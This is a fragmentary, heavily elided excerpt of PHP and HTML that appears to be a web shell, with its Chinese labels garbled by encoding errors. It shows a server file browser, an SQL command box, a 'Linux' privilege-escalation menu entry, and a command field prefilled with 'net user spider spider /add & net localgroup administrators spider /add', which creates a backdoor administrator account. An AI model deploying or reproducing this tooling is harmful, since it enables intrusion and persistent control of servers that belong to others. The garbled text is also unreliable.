...
<script type="text/javascript">
	...
	<table border="0"><tr>
	<td class="toptd" style="width:450px;"> <a href="?s=a&p={$UP_DIR}"><b>ϼĿ¼</b></a> </td>
...
<input type="radio" name="gi" value="b">ļ 
<input type="radio" name="gi" value="c">ļĩβ</div>
...
function autoup(){
	...
	if(document.getElementById('tca').value == ''){alert('滻벻Ϊ');return false;}
...
{
print<<<END
<div class="actall">ʺ <input name="user" type="text" value="spider" style="width:200px">
...
{
print<<<END
<div class="actall">Ȩ <input name="SUCommand" type="text" value="net user spider spider /add & net localgroup administrators spider /add" style="width:600px"><br>
...
<div class="actall">װɹ <br><input type="text" name="sqlcmd" value="{$sqlcmd}" style="width:515px;">
...
<html>
	<body style="background:#AAAAAA;">
		...
		<div style="width:350px;height:80px;clear:both;"><input type="submit" value="08Сѧϰר" style="width:80px;"></div>
		</div>
		</form>
		</center>
	</body>
			...
			<div style="height:546px;">
				...
				<td width="140" align="center" valign="top">
					<ul class="listbg">
						...
						<li><a href="?s=k" id="t_10" onclick="switchTab('t_10')" target="main"> LinuxȨ </a></li>
